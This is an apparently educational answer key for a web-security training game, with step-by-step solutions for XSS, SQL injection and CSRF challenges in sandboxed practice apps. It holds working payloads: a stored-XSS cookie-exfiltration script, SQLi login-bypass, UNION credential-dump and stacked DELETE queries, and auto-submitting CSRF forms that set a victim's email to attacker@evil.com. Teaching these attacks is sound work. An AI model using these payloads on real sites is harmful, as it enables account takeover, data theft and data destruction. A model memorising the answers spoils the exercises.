# CyberQuest — Challenge Answers

> **Spoilers ahead.** This document contains step-by-step walkthroughs, solution payloads, and explanations for every challenge.

---

## Cross-Site Scripting (XSS)

### Challenge 1: The Comment Board *(ByteBoard · Difficulty 1 · 100 pts)*

**Goal:** Make the page execute `alert('xss')`

**Steps:**
1. Look at the comment field in the ByteBoard panel — anything you type gets pasted directly into the page HTML.
2. In the Payload editor, type the payload below and click **Inject into Page**.
3. The script tag executes immediately on page load.

**Payload:**
```html
<script>alert('xss')</script>
```

**How it works:**
- The comment field pastes your input directly into the HTML with no sanitization.
- The `<script>` tag is treated as real code by the browser and runs immediately on page load.
- This is **reflected XSS** — the attack travels in the URL, so anyone who clicks the same link gets hit.

---

### Challenge 2: The Analytics Script *(DevDocs · Difficulty 2 · 150 pts)*

**Goal:** Break out of the JavaScript string and call `alert('xss')`

**Steps:**
1. Type anything in the editor and click **Inject into Page**. Notice the page reflects your search query.
2. Right-click inside the DevDocs panel → **View Frame Source**. Scroll to the bottom and find the analytics `<script>` block — your input appears inside: `var _lastQuery = "YOUR_INPUT";`
3. The vulnerability is at the JavaScript level, not HTML. You need to close the string with `"` and inject code after it.
4. Enter the payload below and click **Inject into Page**.

**Payload:**
```
"; alert('xss')//
```

**How it works:**
- The leading `"` closes the `_lastQuery` string early — you are now writing live JavaScript.
- `alert('xss')` runs as a free-standing statement.
- The trailing `//` comments out the remaining `";` that would have caused a syntax error.
- HTML tag filters are useless here because the attack is at the **JavaScript string** level, not the HTML level.

---

### Challenge 3: The Return Link *(ReturnPortal · Difficulty 2 · 150 pts)*

**Goal:** Make the page execute `alert('xss')` by injecting a `javascript:` URI as the return URL

**Steps:**
1. Click **Login** on the CorpDash panel. You are taken to the ReturnPortal login success page.
2. Notice the "Returning to:" field — it reflects your current payload as the return URL.
3. Right-click the panel → **View Frame Source**. Find the comment near the return link: the `href` is set directly from your input with no scheme validation.
4. Enter the payload below and click **Set Return URL**.
5. Click the **"← Return to previous page"** link in the portal to trigger the JavaScript URI.

**Payload:**
```
javascript:alert('xss')
```

**How it works:**
- Your input becomes the `href` of an anchor tag with no scheme validation.
- `javascript:` is a valid URI scheme — when the link is clicked, the browser executes the code after the colon instead of navigating.
- No `<script>` tag is involved — the attack lives entirely inside an `href` attribute.

---

### Challenge 4: The Profile Page *(ProfileHub · Difficulty 2 · 150 pts)*

**Goal:** Make the page execute `alert('xss')` by breaking out of the `value` attribute and injecting an event handler

**Steps:**
1. Type anything in the editor and click **Save Profile**. The value appears in the username input field.
2. Right-click the panel → **View Frame Source**. Find the comment near the username input — your input lands inside `value="..."` with quotes unescaped.
3. You need to close the `value` attribute with `"` and inject a new HTML attribute on the same element.
4. Enter the payload below and click **Save Profile**.
5. **Click the username input field** in the portal to fire the `onclick` handler.

**Payload:**
```
" onclick="alert('xss')
```

**How it works:**
- The leading `"` closes the `value` attribute early — you are now writing raw HTML attributes on the `<input>` element.
- `onclick="alert('xss')"` is parsed as a legitimate event handler attribute.
- The server's `<script>` tag filter is irrelevant — the attack never used a script tag.

---

### Challenge 5: The Note Board *(NoteNest · Difficulty 3 · 200 pts)*

**Goal:** Post a note that exfiltrates the session cookie without the victim noticing

**Steps:**
1. First, confirm scripts run. Enter `<script>alert(document.cookie)</script>` in the editor and click **Post Note**. An alert pops with the session token — XSS is confirmed and `document.cookie` is readable.
2. Right-click the panel → **View Frame Source**. Scroll to the bottom and find the `/logCookie` endpoint — this is where you will exfiltrate the cookie.
3. Now combine both findings: use `fetch()` to silently send `document.cookie` to `/logCookie` as a URL parameter.
4. Enter the payload below and click **Post Note**. The note is saved and runs automatically for every visitor.

**Payload:**
```html
<script>fetch('/logCookie?c='+document.cookie)</script>
```

**How it works:**
- Your `<script>` tag is saved to the server and runs automatically in every visitor's browser — no click required.
- `document.cookie` is readable because the session cookie is not marked `HttpOnly`.
- `fetch()` silently sends the token to `/logCookie` as a URL parameter.
- This is **stored XSS** — unlike Challenge 1, the attacker only posts once and every future visitor is compromised automatically.

---

## SQL Injection (SQLi)

> **Note:** All SQLi challenges use the **SQL Terminal** editor on the left for free-form database recon. Results appear in the **SQL TERMINAL · RECON** panel inside the portal. The win condition only triggers when you inject through the vulnerable input field (login form, search bar, etc.) inside the portal itself.

---

### Challenge 1: The Login Bypass *(AdminPortal · Difficulty 1 · 100 pts)*

**Goal:** Log in as admin without knowing the password

**Steps:**
1. **Recon** — In the SQL Terminal editor, run `SHOW TABLES` and click **Run Query**. The result shows a `users` table.
2. Run `SELECT * FROM users` to see the table contents. Notice the admin row and that the login query uses `AND password = '...'` (a literal string, not the real password — so knowing the real password is useless here).
3. **Find the injection point** — Type anything in the **Username** field inside the login form and watch the Generated Query box update live. Notice your input lands inside: `WHERE username = '...' AND password = '...'`
4. A single `'` closes the username string early. The `--` sequence comments out everything after it on the same line — including the password check.
5. Type the payload below directly into the **Username field** in the portal and click **Login**.

**Payload:**
```
admin' --
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```
The password check is commented out. The database returns the admin row with no password required.

**Alternative payloads that also work:**
```
' OR 1=1 --
' OR role='admin' --
```

---

### Challenge 2: The Product Search *(ShopDB · Difficulty 2 · 200 pts)*

**Goal:** Dump the users table — make admin's credentials appear in the search results

**Steps:**
1. **Recon — discover tables** — In the SQL Terminal editor, run `SHOW TABLES` and click **Run Query**. You will see both `products` and `users` listed.  
   *(Alternatively: right-click the portal → View Frame Source and look for the HTML comment near the bottom of the page.)*
2. **Recon — discover columns** — Run `SELECT * FROM users LIMIT 1` in the terminal. The result shows the column names: `id`, `username`, `password`.
3. **Find the injection point** — Type anything in the **Product Search** bar inside the portal and watch the Generated Query box. Your input lands inside: `WHERE name LIKE '%...%'`. A single `'` breaks out of the LIKE string.
4. **Count the columns** — The UNION must return the same number of columns as the original SELECT. Test in the search bar:
   - `' ORDER BY 3 --` → works (3 columns confirmed)
   - `' ORDER BY 4 --` → error (too many)
5. **Confirm column positions** — Type `' UNION SELECT 1,2,3 --` in the search bar. A row with values `1`, `2`, `3` appears — columns confirmed.
6. **Inject** — Replace the filler values with the columns from `users`. Type the payload below directly into the **Search bar** in the portal and click **Search**.

**Payload:**
```
' UNION SELECT 1, username, password FROM users --
```

**Resulting query:**
```sql
SELECT id, name, price FROM products WHERE name LIKE '%'
UNION SELECT 1, username, password FROM users --%'
```
The admin row from `users` is appended to the product results, highlighted in orange.

---

### Challenge 3: The Employee Directory *(StaffDB · Difficulty 3 · 300 pts)*

**Goal:** Use a stacked query to delete every row from the employees table

**Steps:**
1. **Recon** — In the SQL Terminal editor, run `SHOW TABLES`. Only `employees` exists. Run `SELECT * FROM employees` to confirm there are 5 rows across Engineering, HR, and Finance.
2. **Find the injection point** — Type `Engineering` in the **Department** search bar inside the portal and observe the Generated Query: `WHERE dept = 'Engineering'`. Your input lands directly inside single quotes.
3. **Break out of the string** — Type `'` in the search bar. The Generated Query shows the quote breaking out of the string. You are now writing raw SQL.
4. **Chain a second statement** — A semicolon `;` terminates the current SELECT and begins a completely independent second statement. `DELETE FROM employees WHERE 1=1` removes every row — `WHERE 1=1` is always true.
5. Type the payload below directly into the **Department search bar** in the portal and click **Search**.
6. The DB row counter drops to 0 and the win banner fires. Click **↺ Reset DB** to restore data and experiment further.

**Payload:**
```
'; DELETE FROM employees WHERE 1=1 --
```

**What the database executes:**
```sql
-- Statement 1 (SELECT returns no rows — dept = '' matches nothing)
SELECT id, name, dept FROM employees WHERE dept = ''

-- Statement 2 (runs independently — wipes all 5 rows)
DELETE FROM employees WHERE 1=1
```

**Variants that also work:**
```
'; DELETE FROM employees WHERE dept='Engineering' --   ← deletes only Engineering dept
'; DELETE FROM employees WHERE 1=1; --                 ← trailing semicolon also valid
```

---

## Cross-Site Request Forgery (CSRF)

> **Note:** All CSRF challenges use the **two-pane sandbox** — the left pane is the attacker page you craft, the right pane is the victim's logged-in session. Write your HTML in the editor and click **Launch Attack**. The victim pane updates in real time when the forged request lands.

---

### Challenge 1: The Silent Request *(UserHub · Difficulty 1 · 100 pts)*

**Goal:** Change the victim's email to attacker@evil.com using only HTML.

**Steps:**
1. Look at the victim pane on the right — the logged-in user's email is `victim@corp.com`.
2. The endpoint `/change-email` accepts a GET request with an `email` query parameter and no CSRF token.
3. An `<img>` tag fires a GET request for its `src` automatically when the page loads — even if the URL isn't an image.
4. Enter the payload below in the editor and click **Launch Attack**.
5. Watch the victim pane — the email changes to `attacker@evil.com` and the success modal appears.

**Payload:**
```html
<img src="/change-email?email=attacker@evil.com">
```

**How it works:**
- The `<img>` tag tells the browser to fetch `/change-email?email=attacker@evil.com` the instant the attacker page loads.
- The browser attaches the victim's session cookie automatically — it does this for every matching request, no matter where the request originates.
- The server sees a valid authenticated GET request and changes the email. It has no way to tell the request came from a different page.
- This is **GET-based CSRF** — any endpoint that changes state via GET is exploitable with a single HTML tag.

---

### Challenge 2: The Hidden Form *(UserHub · Difficulty 2 · 150 pts)*

**Goal:** Change the victim's email to attacker@evil.com using a POST request.

**Steps:**
1. The endpoint now requires POST — the `<img>` trick from Challenge 1 no longer works (browsers only fire GET requests from `<img>`).
2. A `<form>` can send POST. Hidden inputs hold the data, and a `<script>` can submit the form automatically before the victim sees anything.
3. Enter the payload below in the editor and click **Launch Attack**.
4. Watch the victim pane — the email changes and the success modal appears.

**Payload:**
```html
<form method="POST" action="/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

**How it works:**
- The hidden form is invisible to the victim — no UI, no prompt, nothing to click.
- `document.forms[0].submit()` fires the moment the attacker page loads, sending a POST to `/change-email`.
- The browser attaches the session cookie to POST requests automatically — just as it does for GET.
- The server receives a valid authenticated POST and changes the email. Using POST instead of GET is necessary but not sufficient — without a CSRF token, the server still can't distinguish a forged request from a real one.

---

### Challenge 3: The Useless Token *(UserHub · Difficulty 2 · 150 pts)*

**Goal:** Change the victim's email to attacker@evil.com despite the CSRF token field.

**Steps:**
1. Look at the victim pane — notice the CSRF token field is shown. The form has a `csrf_token` field.
2. The server checks that the field *exists*, but never validates whether the value matches the session token.
3. Include the `csrf_token` field in your forged form with any value — `fake`, `x`, or even an empty string.
4. Enter the payload below in the editor and click **Launch Attack**.

**Payload:**
```html
<form method="POST" action="/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf_token" value="fake">
</form>
<script>document.forms[0].submit()</script>
```

**How it works:**
- The `csrf_token` field is present in the form, but the server never checks whether it matches the session's real token.
- Submitting any value — `fake`, `x`, an empty string — succeeds because the validation is missing.
- A CSRF token only protects against forgery if the server validates that the submitted value matches the one it generated for this session.
- This is one of the most common CSRF token failures: the infrastructure is in place, but the actual check was never implemented.
